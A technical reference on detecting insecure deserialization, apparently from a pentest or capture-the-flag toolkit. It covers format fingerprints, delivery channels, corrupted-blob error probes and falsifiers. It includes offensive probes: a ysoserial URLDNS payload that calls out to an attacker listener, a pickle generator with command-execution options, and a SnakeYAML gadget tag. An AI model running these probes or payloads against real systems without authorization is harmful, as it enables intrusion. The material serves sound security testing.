# Deserialization Detection

## The one question detection answers

*Does the application pass attacker-controlled bytes into a parser that
instantiates typed objects?* Everything below is a way to answer yes/no —
format fingerprint, delivery channel, or a malformed-blob differential.

## Magic bytes — fingerprint table

| Format | Raw prefix | Base64 prefix | Where it shows |
|---|---|---|---|
| PHP serialize | `a:`, `O:`, `s:`, `i:`, `b:` | `YToy`, `Tzo`, `czo` | cookie, param, session file |
| Java serialization | `AC ED 00 05` | `rO0` | POST body, header `x-java-serialized-object` |
| Python pickle p0-2 | `(`, `I`, `S`, `c` | `gAR`, `gAJ`, `KA` | cookie, cache file, job queue |
| Python pickle p3-5 | `80 03`-`80 05` | `gAN`/`gAQ`/`gAU` | same |
| Ruby Marshal 4.8 | `04 08` | `BAh` | cookie, cache, session |
| .NET BinaryFormatter | `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////` | POST body, ViewState |
| ViewState (ASP.NET) | varies | `/wEP` | `__VIEWSTATE` field |
| JSON.NET type hints | `{"$type":` | `eyIkdHlwZSI` | JSON body |
| Node serialize | `_$$ND_FUNC$$_` | — | JSON field |
| SnakeYAML typed | `!!javax.` or `!<tag:` | — | YAML body/file |
| PyYAML typed | `!!python/object` | — | YAML body/file |
| Ruby Psych typed | `!ruby/object:` | — | YAML body/file |
| msgpack typed ext | `C7`-`C9` ext type | — | binary body |
| Hessian | `63 02 01` etc | — | binary body |
| XStream/Java XML | `<com.foo.Bar>` class names | — | XML body |

### The decode reflex

```bash
# every blob that looks opaque: decode, then fingerprint
echo -n "$BLOB" | base64 -d 2>/dev/null | xxd | head -4
# a second decode is the rule, not the exception:
echo -n "$BLOB" | base64 -d | base64 -d 2>/dev/null | xxd | head -4
# URL-encoding wraps encoding wraps the blob — unwrap in order:
echo -n "$BLOB" | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read()))" | base64 -d | xxd | head
```

## Delivery channels — where the blob hides

### Cookie
```bash
# session, "remember me", "user", "prefs", "data", "auth"
# Rails: _app_session (signed marshal inside)
# Django: sessionid (signed pickle pre-1.6 era, JSON after)
# Flask: session (itsdangerous-signed pickle pre-1.0, JSON after)
# Laravel: custom encrypted cookies around PHP serialize
# Java EE: custom beans serialized into session cookies
```

### Header
```
X-Forwarded-Server-Data: <b64 blob>
X-Serialized-User: O:8:"User":...
Authorization: Bearer <JWT whose payload contains a serialized field>
```

### Request body
```
POST /import  Content-Type: application/octet-stream   → raw stream
POST /api     {"data":"<b64>"}                        → JSON wrapper
POST /upload  file part                              → serialized file
POST /xml     <foo>...</foo>                          → XStream/JAXB/XMLDecoder
POST /yaml    --- !!javax.script.ScriptEngineManager → Snakeyaml
```

### Less obvious
- **WebSocket frame** carrying a serialized field
- **Job queue message** (Sidekiq/Resque/Celery payloads are serialized)
- **Cache value** written by one endpoint, read by another (second-order)
- **File the app reads later** (upload → background job unmarshals it)
- **Backup/export file** the admin import unmarshals

## The corrupted-blob differential — the cheapest prove

The FIRST probe is never a gadget. Take the real blob, corrupt it one way,
send it back:

```bash
# PHP: break the grammar — remove a closing brace
O:8:"User":2:{s:4:"name";s:5:"admin";        # unbalanced

# Java: flip one byte in the classdesc
# Python: truncate the pickle stream mid-opcode
# .NET: drop one byte of the base64 tail
```

**What "yes" looks like:**

| Response | Interpretation |
|---|---|
| PHP warning `unserialize(): Error at offset N` / `__PHP_Incomplete_Class` | PHP `unserialize()` reached |
| `InvalidClassException`, `StreamCorruptedException`, `ClassNotFoundException` | Java `readObject` reached |
| `EOFError`, `UnpicklingError`, `ValueError: insecure pickle` | `pickle.loads` reached |
| `ArgumentException`, `SerializationException`, `EndOfStream` | BinaryFormatter reached |
| `ArgumentError: dump format error`, `TypeError` | `Marshal.load` reached |
| generic 500 with same body as a well-formed request | consumer exists, parser opaque — keep digging |
| identical 200 to both valid and malformed | NOT consumed here — falsifier |

**The timing variant:** a corrupted stream sometimes fails *later* than a
well-formed one (it gets further into the object graph). A consistent 50-200ms
delta between valid and malformed is a weak yes — corroborate with an error
probe before building a gadget.

## Error-message fingerprints (what each parser says when it chokes)

```
PHP unserialize:    "unserialize(): Error at offset", "__PHP_Incomplete_Class",
                    "allowed_classes" notice, "Object of class X could not be
                    converted to string" when a magic method fires
Java OIS:           java.io.InvalidClassException: local class incompatible
                    java.io.StreamCorruptedException: invalid stream header
                    java.lang.ClassNotFoundException: com.target.Class
Python pickle:      _pickle.UnpicklingError: pickle data was truncated
                    AttributeError: Can't get attribute 'X' on <module>
Ruby Marshal:       ArgumentError: dump format error (0xNN)
                    TypeError: incompatible marshal file format
.NET BinaryFormatter: System.Runtime.Serialization.SerializationException:
                    End of Stream encountered before parsing was completed
Yaml load:          ConstructorException: could not determine a constructor
                    for the tag tag:yaml.org,2002:python/object:os.system
Fastjson:           com.alibaba.fastjson.JSONException: autoType is not allowed
```

## Active probes that don't need a gadget

### Class-load error probe (Java)
Send a stream whose classdesc names a class the target almost certainly does
NOT have — `com.attacker.DoesNotExist`. A `ClassNotFoundException` naming YOUR
class proves `readObject` ran on your bytes. This is the single most reliable
black-box Java confirmation.

### DNS-callback probe (Java)
`URLDNS` is the ysoserial chain with zero library dependencies — it resolves a
hostname during `Hashtable.readObject`. Callback = deserializer ran.

```bash
java -jar ysoserial.jar URLDNS http://x1.YOUR-LISTENER/ >urldns.ser
base64 -w0 urldns.ser   # send as the blob
# → OOB hit proves readObject; then fingerprint library versions with GadgetProbe
```

### Marker-callback probe (Python)
`tools/pickle_gen.py --marker X1` builds a benign object whose class name is
`PWNED_X1` — if the app reflects the class name, the string it carried, or an
error mentioning it, pickle ran. `--cmd`/`--eval` are only for AFTER the sink
is confirmed.

### String-content probe (PHP)
Send `s:999:"x";` — a length-lie. `unserialize()` reports `Error at offset`
mentioning the declared length — proof the PHP grammar is parsing your bytes.

## Falsifiers — what actually closes this class

- Malformed input returns byte-identical response AND timing to valid input.
- The blob is JSON/XML after decode — no typed-object grammar.
- The blob is signed (HMAC/EdDSA) and no key is leaked or reachable — the
  bytes are sealed; spend the budget on the key instead.
- The "serialized" field is stored verbatim and never read back through a
  deserializer (pure storage — second-order check needed).
- The parser is `safe_load`/`unserialize($x,['allowed_classes'=>[]])` with
  NO permitted gadget surface — verify by error-diff on a typed tag.

## The discriminating one-shot

```bash
python3 tools/web/http_probe.py --challenge "$C" --class web-deserialization \
  --url "$BASE/api/me" --method POST \
  --header "Cookie: user=$BLOB_CORRUPTED" \
  --evidence-regex 'unserialize|Unpickling|InvalidClass|SerializationException|dump format|Incomplete_Class' \
  --evidence-kind class --on-match confirms --on-miss inconclusive
```

Corrupted blob → parser error string = deserialization confirmed, class proves.
Then fingerprint the format and open the right module.
